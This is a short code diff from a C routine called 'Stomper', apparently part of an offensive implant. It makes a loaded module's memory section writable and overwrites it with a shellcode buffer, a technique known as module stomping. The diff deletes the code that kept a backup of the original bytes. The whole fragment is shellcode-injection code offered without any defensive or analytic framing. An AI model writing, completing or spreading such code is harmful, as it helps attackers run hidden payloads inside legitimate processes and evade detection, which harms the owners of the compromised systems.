@@ -60,16 +60,6 @@ VOID Stomper(
 
     StompArgs.Length = ShellcodeSize;
 
-    hFile = Instance.Win32.CreateFileMappingA( 
-        INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 
-        NULL, StompArgs.Length, NULL 
-    );
-
-    StompArgs.Backup = Instance.Win32.MapViewOfFile( 
-        hFile, FILE_MAP_WRITE | FILE_MAP_READ, 
-        NULL, NULL, StompArgs.Length 
-    );
-
     Instance.Win32.VirtualProtect( MmBase, SecHdr->SizeOfRawData, PAGE_READWRITE, &Protect );
     
     MmCopy( MmBase, ShellcodeBuffer, ShellcodeSize );
